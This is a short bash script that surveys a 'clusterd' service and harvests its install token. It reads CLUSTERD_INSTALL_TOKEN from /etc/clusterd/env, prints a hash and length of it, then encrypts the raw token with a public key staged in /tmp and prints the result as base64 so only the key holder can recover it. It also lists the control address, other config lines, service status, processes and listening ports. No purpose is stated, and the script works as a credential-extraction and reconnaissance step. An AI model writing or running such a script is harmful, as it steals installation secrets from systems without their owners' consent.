#!/bin/bash
echo "== S1 clusterd env meta =="
ls -la /etc/clusterd/ /var/lib/clusterd/ 2>&1
echo "== S2 token meta =="
T=$(grep -oE 'CLUSTERD_INSTALL_TOKEN=.*' /etc/clusterd/env 2>/dev/null | cut -d= -f2-)
echo "TOKEN sha16=$(printf %s "$T" | sha256sum | cut -c1-16) len=${#T}"
grep -E 'CLUSTERD_CONTROL_ADDR|CONTROL_ADDR' /etc/clusterd/env 2>/dev/null
grep -vE 'TOKEN|SECRET|KEY' /etc/clusterd/env 2>/dev/null | head -10
echo "== S3 encrypted token =="
printf %s "$T" | openssl pkeyutl -encrypt -pubin -inkey /tmp/rr_pub.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 2>/dev/null | base64 | tr -d '\n'
echo
echo "== S4 clusterd status =="
systemctl status clusterd --no-pager 2>&1 | head -8
ps aux | grep -i clusterd | grep -v grep | head -3
ss -tlnp 2>/dev/null | grep -E '7777|7778' | head -4
echo "== s-done =="
